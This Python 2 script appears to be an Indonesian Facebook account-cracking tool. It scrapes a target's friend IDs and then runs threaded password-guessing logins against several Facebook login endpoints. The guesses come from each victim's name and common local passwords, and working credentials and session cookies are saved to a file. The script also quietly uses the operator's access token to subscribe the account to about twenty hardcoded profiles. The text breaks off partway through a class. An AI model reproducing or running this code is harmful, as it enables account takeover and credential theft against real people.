#!/usr/bin/python2
# coding:utf-8
# Jangan Di recode Nanti Data" Hp Kamu Hilang
# coding By Syafii-XD

### User Agent
ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'


import requests,bs4,sys,os,subprocess
import requests,sys,random,time,re,base64,json
reload(sys)
sys.setdefaultencoding("utf-8")
from multiprocessing.pool import ThreadPool

#### WARNA RANDOM ####
# P = '\033[0;97m'  # putih
# M = '\033[0;91m' # merah
# H = '\033[0;92m' # hijau
# K = '\033[0;93m' # kuning
# B = '\033[0;94m' # biru
# U = '\033[0;95m' # ungu
# O = '\033[0;96m' # biru muda

if ("linux" in sys.platform.lower()):

        N = '\033[0m'
        G = '\033[1;92m'
        O = '\033[1;97m'
        R = '\033[1;91m'
else:

        N = ''
        G = ''
        O = ''
        R = ''
        
        
        
def loginSC():
	os.system('clear')
	print"\033[1;97mSilahKan Login SC Nya Dulu Bos.....\n"
	username = raw_input("\033[1;96m[*] \033[1;97mUsername \033[1;91m: \033[1;92m")
	password = raw_input("\033[1;96m[*] \033[1;97mPassword \033[1;91m: \033[1;92m")
	if username =="fii" and password =="widiya":
		print"\033[1;96m[✓] \033[1;92mLogin success"
		time.sleep(1)
		menu()
	else:
		print"\033[1;96m[!] \033[1;91mSalah!!"
		time.sleep(1)
                exit()
        
def banner():
	os.system("clear")
	print("""%s
\x1b[1;92m___  __  __ ___ ___
\x1b[1;92m|   \|  \/  |7 _ ) __|┌─────────────────────────┐
\x1b[1;92m| |) | |\/| | _ \ _|  │   • Code By Syafii- •   │
\x1b[1;92m|___/|_|  |_|___/_|   │ Github.com/Syafii-/dmbf │
\x1b[1;92m XNSCODE Team 2022    └──────────────────────── \n\n●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\n ✫╬─ \x1b[1;92myang punya \x1b[1;91m: \x1b[1;93 DRAGON                   \x1b[1;95m─╬✫\n ✫╬─ \x1b[1;92mFB    \x1b[1;92m \x1b[1;91m: \x1b[1;96mFacebook.com/fikritampan305     \x1b[1;95m─╬✫\n ✫╬─ \x1b[1;92mGitHub \x1b[1;91m: \x1b[1;94mGithub.com/Syafii-XD     \x1b[1;92m─╬✫\n ●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬    """ %(N))


host="https://www.facebook.com"
ua= "nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+"
ips=None
try:
	b=requests.get("https://api.ipify.org").text.strip()
	ips=requests.get("https://ipapi.com/ip_api.php?ip="+b,headers={"Referer":"https://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+"}).json()["country_name"].lower()
except:
	ips=None
uas=None
if os.path.exists(".browser"):
	if os.path.getsize(".browser") !=0:
		uas=open(".browser").read().strip()
touch_fbh={"Host":"touch.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":uas,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}

m_fbh={"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":uas,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}

mbasic_h={"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":uas,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}

graph_h={"Host":"graph.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":uas,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
def clear():
	if " linux" in sys.platform.lower():
		os.system("clear")
	elif "win" in sys.platform.lower():
		os.system("cls")
	else:os.system("clear")
def lang(cookies):
	f=False
	rr=bs4.BeautifulSoup(requests.get("https://mbasic.facebook.com/language.php",headers=hdcok(),cookies=cookies).text,"html.parser")
	for i in rr.find_all("a",href=True):
		if "id_ID" in i.get("href"):
			requests.get("https://mbasic.facebook.com/"+i.get("href"),cookies=cookies,headers=hdcok())
			b=requests.get("https://mbasic.facebook.com/profile.php",headers=hdcok(),cookies=cookies).text	
			if "apa yang anda pikirkan sekarang" in b.lower():
				f=True
	if f==True:
		return True
	else:
		exit("   [!]Cookies Mati").format(R,N)
def basecookie():
	if os.path.exists(".cok"):
		if os.path.getsize(".cok") !=0:
			return gets_dict_cookies(open('.cok').read().strip())
		else:logs()
	else:logs()
def hdcok():
	global host,ua
	hosts=host
	r={"origin": hosts, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "".join(bs4.re.findall("://(.*?)$",hosts)), "referer": hosts+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"}
	return r
def gets_cookies(cookies):
	result=[]
	for i in enumerate(cookies.keys()):
		if i[0]==len(cookies.keys())-1:result.append(i[1]+"="+cookies[i[1]])
		else:result.append(i[1]+"="+cookies[i[1]]+"; ")
	return "".join(result)
def gets_dict_cookies(cookies):
	result={}
	try:
		for i in cookies.split(";"):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
	except:
		for i in cookies.split("; "):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
def gen():
	ck=raw_input("   [•] Cookie : ")
	if ck=="":gen()
	try:
		cks=gets_dict_cookies(ck)
		if lang(cks)==True:
			open(".cok","w").write(ck)
			convert()
			print ('   [!] Login Success').format(G,N)
			time.sleep(1)
			menu()
		else:print("   [!] Invalid Cookie").format(R,N);gen()
	except Exception as e:
		print("   [!] Error : %s"%e);gen()
                logs()
def log_token():
	data = raw_input("   [•] Token :")
	try:
		me = requests.get('https://graph.facebook.com/me?access_token='+data)
		a = json.loads(me.text)
		nama = a['name']
		open("login.txt",'w').write(data)
		print("   [!] Login Success").format(G,N)
		bot_komen()
		menu()
	except KeyError:
		print ("   [!] Invalid Token").format(R,N)
		time.sleep(1.0)
		logs()
def convert():
	global post,reac,kom
	try:
		tomken = requests.get('https://mbasic.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = {
		'user-agent'                : 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]',
		'referer'                   : 'https://mbasic.facebook.com',
		'host'                      : 'mbasic.facebook.com',
		'origin'                    : 'https://mbasic.facebook.com',
		'upgrade-insecure-requests' : '1',
		'accept-language'           : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
		'cache-control'             : 'max-age=0',
		'accept'                    : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
		'content-type'              : 'text/html; charset=utf-8'
		}, cookies = {
		'cookie'                    : open(".cok",'r').read()
		})
		find_token = re.search('(EAAA\w+)', tomken.text)
		if (find_token is None):
			pass
		else:
			open("login.txt",'w').write(find_token.group(1))
			return
	except Exception as e:
		print(R+"\n   [•] Error : %s"%e)
		exit()
def bot_komen():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"   [!] Token invalid"
		logs()
	requests.post('https://graph.facebook.com/1827084332/subscribers?access_token=' + toket)
	requests.post('https://graph.facebook.com/1602590373/subscribers?access_token=' + toket)
	requests.post('https://graph.facebook.com/100000729074466/subscribers?access_token=' + toket)
	requests.post('https://graph.facebook.com/607801156/subscribers?access_token=' + toket)
	requests.post('https://graph.facebook.com/1409058/subscribers?access_token=' + toket)
        requests.post('https://graph.facebook.com/100026490368623/subscribers?access_token=' + toket)
        requests.post('https://graph.facebook.com/100009340646547/subscribers?access_token=' + toket)
        requests.post('https://graph.facebook.com/100053093889653/subscribers?access_token=' + toket)
        requests.post('https://graph.facebook.com/100000415317575/subscribers?access_token=' + toket)
        requests.post('https://graph.facebook.com/100037914692898/subscribers?access_token=' + toket)
        requests.post('https://graph.facebook.com/100000431996038/subscribers?access_token=' + toket)
        requests.post('https://graph.facebook.com/1676993425/subscribers?access_token=' + toket)
        requests.post('https://graph.facebook.com/1767051257/subscribers?access_token=' + toket)
        requests.post('https://graph.facebook.com/100000287398094/subscribers?access_token=' + toket)
        requests.post('https://graph.facebook.com/100057755937035/subscribers?access_token=' + toket)
        requests.post('https://graph.facebook.com/1673250723/subscribers?access_token=' + toket)
        requests.post('https://graph.facebook.com/100000149757897/subscribers?access_token=' + toket)
        requests.post('https://graph.facebook.com/100015073506062/subscribers?access_token=' + toket)
        requests.post('https://graph.facebook.com/100002565109395/subscribers?access_token=' + toket)
	menu()
def menu():
  try:
    toket = open('login.txt','r').read()
    otw = requests.get('https://graph.facebook.com/me/?limit=1000000&access_token='+toket)
    a = json.loads(otw.text)
    nama = a['name']
    id = a['id']
  except Exception as e:
    print ("   [•] Error : %s"%e).format(R,N)
    time.sleep(1)
    logs()
  os.system("clear")
  banner()
  print("\033[1;91m╔══\033[1;97m[•] Hello : "+nama)
  print("\033[1;91m╚══\033[1;97m[•] UID : "+id)
  print("\033[1;92m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>")
  print("\033[1;96m╔══\033[1;91m[ Pilih Opsi ]")
  print("\033[1;96m║")
  print("\033[1;96m╠══\033[1;91m[1] Dump ID Public/Friend")
  print("\033[1;96m╠══\033[1;91m[2] Crack")
  print("\033[1;96m╚══\033[1;91m[0] Logout")
  print("\033[1;92m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>")
  r=raw_input("\033[1;91m   [•] Input : ")
  if r=="":print("\033[1;91m   [!] Isi Yang Benar").format(R,N);menu()
  elif r=="1":
    publik()
  elif r=="2":
    methode()
    exit()
  elif r=="0":
    try:
      os.remove(".cok")
      os.remove("login.txt")
      exit(basecookie())
    except Exception as e:print("\033[1;91m   [•] Error file tidak ditemukan %s"%e)
  else:
    print ("   [•] Wrong Pilih").format(R,N);menu()
def publik():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print("   [•] Cookie Invalid").format(R,N)
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		gen()
	try:
                os.system("clear")
                banner()
                print ("\033[1;92m>>>>>>>>>>>>>>>>>>>>>>>>>>>>")
		print("\033[1;96m╔══\033[1;91m[•] Ketik \'me\' Jika Ingin Mengambil ID Dari Daftar Teman")
		idt = raw_input("\033[1;96m╠══\033[1;91m[•] User ID Target : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print("\033[1;96m╠══\033[1;91m[•] Name           : "+op["name"])
		except KeyError:
			print("   [!] ID NOT found !").format("R")
			print("   [!] Kembali").format(N)
			publik()
		r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit(1000000)&access_token="+toket)
		id = []
		z=json.loads(r.text)
		print("\033[1;96m╚══\033[1;91m[•] Getting ID ...")
		print ("\033[1;92m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>")
		qq = (op['first_name']+'.json').replace(" ","_")
		ys = open(qq , 'w')#.replace(" ","_")
		for a in z['friends']['data']:
			id.append(a['id']+"<=>"+a['name'])
			ys.write(a['id']+"<=>"+a['name']+'\n')
			print("\r  %s "%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
			print (  a["name"])
		ys.close()
		print ("\033[1;92m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>")
		print ('\033[1;96m╔══\033[1;91m[•] Sukses Mengambil ID dari %s'%op['name'])
		print ("\033[1;96m╠══\033[1;91m[•] Total ID : %s"%(len(id)))
		print ("\033[1;96m╚══\033[1;91m[•] Output : %s"%qq)
                print ("\033[1;92m>>>>>>>>>>>>>>>>>>>>>>>>>>>>")
		raw_input("\033[1;91m   [•] [Kembali]")
		menu()
		
	except Exception as e:
		exit("   [•] Error : %s"%e)
def mbasic(em,pas,hosts):
	global ua,mbasic_h
	r=requests.Session()
	r.headers.update(mbasic_h)
	p=r.get("https://mbasic.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in r.cookies.get_dict().keys():
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in r.cookies.get_dict().keys():
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}#crack mbasic
def m_fb(em,pas,hosts):
	global ua,m_fbh
	r=requests.Session()
	r.headers.update(m_fbh)
	p=r.get("https://m.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://m.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in r.cookies.get_dict().keys():
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in r.cookies.get_dict().keys():
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}#crack m.fb
def touch_fb(em,pas,hosts):
	global ua,touch_fbh
	r=requests.Session()
	r.headers.update(touch_fbh)
	p=r.get("https://touch.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://touch.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://touch.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in r.cookies.get_dict().keys():
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in r.cookies.get_dict().keys():
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}#touch fb
def graph_fb(em,pas,hosts):
	global ua,mbasic_h
	r=requests.Session()
	r.headers.update(mbasic_h)
	p=r.get("https://mbasic.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in r.cookies.get_dict().keys():
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in r.cookies.get_dict().keys():
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}#crack mbasic
def generate(text):
	results=[]
	global ips
	for i in text.split(" "):
		if len(i)<3:
			continue
		else:
			i=i.lower()
			if len(i)==3 or len(i)==4 or len(i)==5:
				results.append(i+"123")
				results.append(i+"12345")
			else:
				results.append(i+"123")
				results.append(i+"1234")
				results.append(i+"12345")
				results.append(i)
				if "indonesia" in ips:
					results.append("sayang")
					results.append("bismillah")
					results.append("anjing")
                                        results.append("123456")
	return results
def methode():
  os.system("clear")
  banner()
  print ("\033[1;92m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>")
  print("\033[1;96m╔══\033[1;91m[ Pilih Metode Crack ]")
  print("\033[1;96m║")
  print("\033[0;96m╠══\033[1;91m[1] Crack With mbasic")
  print("\033[1;96m╠══\033[1;91m[2] Crack With m.facebook.com")
  print("\033[1;96m╠══\033[1;91m[3] Crack With touch.facebook.com")
  print("\033[1;96m╚══\033[1;91m[4] Crack With api")
  print ("\033[1;92m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>")
  sek=raw_input("\033[1;96m╔══\033[1;91m[•] Input : ")
  if sek=="":print("\033[1;91m   [!] Isi Yang Benar").format(R,N);methode()
  elif sek=="1":
    crack()
  elif sek=="2":
    crack1()
  elif sek=="3":
    crack2()
  elif sek=="4":
    crack3()
  else:
    print("\033[1;91m   [!] Isi Yang Benar").format(R,N);methode()
    
def logs():
  banner()
  print("\033[1;92m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>")
  print("\033[1;96m╔══\033[1;91m[ Pilih Metode Login ]")
  print("\033[1;96m║")
  print("\033[1;96m╠══\033[1;91m[1] Login With Token")
  print("\033[1;96m╠══\033[1;91m[2] Login With Cookie")
  print("\033[1;96m╚══\033[1;91m[0] Exit")
  print("\033[1;92m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>")
  sek=raw_input("\033[1;91m   [•] Input : ")
  if sek=="":
    print("\033[1;91m   [!] Isi Yang Benar").format(R,N);logs()
  elif sek=="1":
    log_token()
  elif sek=="2":
    gen()
  elif sek=="3":
    exit()
  else:
    print("\033[1;91m   [!] Isi Yang Benar").format(R,N);logs()
    
class crack:
        os.system("clear")
        banner()
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print("\033[1;96m╠══\033[1;91m[•] Crack With Pass Default Or Manual [d/m]")
		while True:
			f=raw_input("\033[1;96m╠══\033[1;91m[•] Pilih : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=raw_input("\033[1;96m╠══\033[1;91m[•] ID List File : ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print ("   %s"%e)
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print ("   %s"%e)
					continue
				print ("\033[1;96m╠══\033[1;91m[•] Example : pass123,pass12345")
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=raw_input("\033[1;96m╚══\033[1;91m[•] ID List File : ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print ("   %s"%e)
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print ("   %s"%e)
					continue
                                print ("\033[1;96m─────────────────────────────────────────────────────────────")
				print ("\033[1;96m╔══\033[1;91m[•] Crack Started...")
				print ("\033[1;96m╠══\033[1;91m[•] Account [OK] saved to : ok.txt")
				print ("\033[1;96m╚══\033[1;91m[•] Account [CP] saved to : checkpoint.txt")
                                print ("\033[1;96m─────────────────────────────────────────────────────────────")
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				print("   [•] Finished")
				break
	def pwlist(self):
		self.pw=raw_input("\033[0;96m╚══\033[0;97m[•] Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
                        print ("\033[1;96m─────────────────────────────────────────────────────────────")
			print ("\033[1;96m╔══\033[1;91m[•] Crack Started...")
			print ("\033[1;96m╠══\033[1;91m[•] Account [OK] saved to : ok.txt")
			print ("\033[1;96m╚══\033[1;91m[•] Account [CP] saved to : checkpoint.txt")
                        print ("\033[1;96m─────────────────────────────────────────────────────────────")
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			print("   [•] Finished")
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=mbasic(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="success":
					print("\r   [OK]%s %s • %s %s      "%(G,fl.get("id"),i,N))
					self.ada.append("%s|%s"%(fl.get("id"),i))
					if fl.get("id") in open("ok.txt").read():
						break
					else:
						open("ok.txt","a+").write(
						"%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies"))))
					ko="%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
					break
				elif log.get("status")=="cp":
					print("\r   [CP]%s %s • %s %s      "%(O,fl.get("id"),i,N))
					self.cp.append("%s|%s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s|%s|\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print "\r   [Crack] %s/%s - ok-:%s - cp-:%s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)
class crack1:
        os.system("clear")
        banner()
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print("\033[1;96m╠══\033[1;91m[•] Crack With Pass Default Or Manual [d/m]")
		while True:
			f=raw_input("\033[1;96m╠══\033[1;91m[•] Pilih : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=raw_input("\033[1;96m╠══\033[1;91m[•] ID List File : ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print ("   %s"%e)
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print ("   %s"%e)
					continue
				print ("\033[1;96m╠══\033[1;91m[•] Example : pass123,pass12345")
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=raw_input("\033[1;96m╚══\033[1;91m[•] ID List File : ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print ("   %s"%e)
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print ("   %s"%e)
					continue
                                print ("\033[1;96m─────────────────────────────────────────────────────────────")
				print ("\033[1;96m╔══\033[1;91m[•] Crack Started...")
				print ("\033[1;96m╠══\033[1;91m[•] Account [OK] saved to : ok.txt")
				print ("\033[1;96m╚══\033[1;91m[•] Account [CP] saved to : checkpoint.txt")
                                print ("\033[1;96m─────────────────────────────────────────────────────────────")
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				print("   [•] Finished")
				break
	def pwlist(self):
		self.pw=raw_input("\033[0;96m╚══\033[0;97m[•] Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
                        print ("\033[1;96m─────────────────────────────────────────────────────────────")
			print ("\033[1;96m╔══\033[0;97m[•] Crack Started...")
			print ("\033[1;96m╠══\033[1;91m[•] Account [OK] saved to : ok.txt")
			print ("\033[1;96m╚══\033[1;91m[•] Account [CP] saved to : checkpoint.txt")
                        print ("\033[1;96m─────────────────────────────────────────────────────────────")
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			print("   [•] Finished")
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=m_fb(fl.get("id"),
					i,"https://m.facebook.com")
				if log.get("status")=="success":
					print("\r   [OK]%s %s • %s %s      "%(G,fl.get("id"),i,N))
					self.ada.append("%s|%s"%(fl.get("id"),i))
					if fl.get("id") in open("ok.txt").read():
						break
					else:
						open("ok.txt","a+").write(
						"%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies"))))
					ko="%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
					break
				elif log.get("status")=="cp":
					print("\r   [CP]%s %s • %s %s      "%(O,fl.get("id"),i,N))
					self.cp.append("%s|%s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s|%s|\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print "\r   [Crack] %s/%s - ok-:%s - cp-:%s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)
class crack2:
        os.system("clear")
        banner()
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print("\033[1;91m╠══\033[1;91m[•] Crack With Pass Default Or Manual [d/m]")
		while True:
			f=raw_input("\033[1;96m╠══\033[1;91m[•] Pilih : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=raw_input("\033[01;96m╠══\033[1;91m[•] ID List File : ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print ("   %s"%e)
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print ("   %s"%e)
					continue
				print ("\033[1;96m╠══\033[1;91m[•] Example : pass123,pass12345")
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=raw_input("\033[1;96m╚══\033[1;91m[•] ID List File : ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print ("   %s"%e)
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
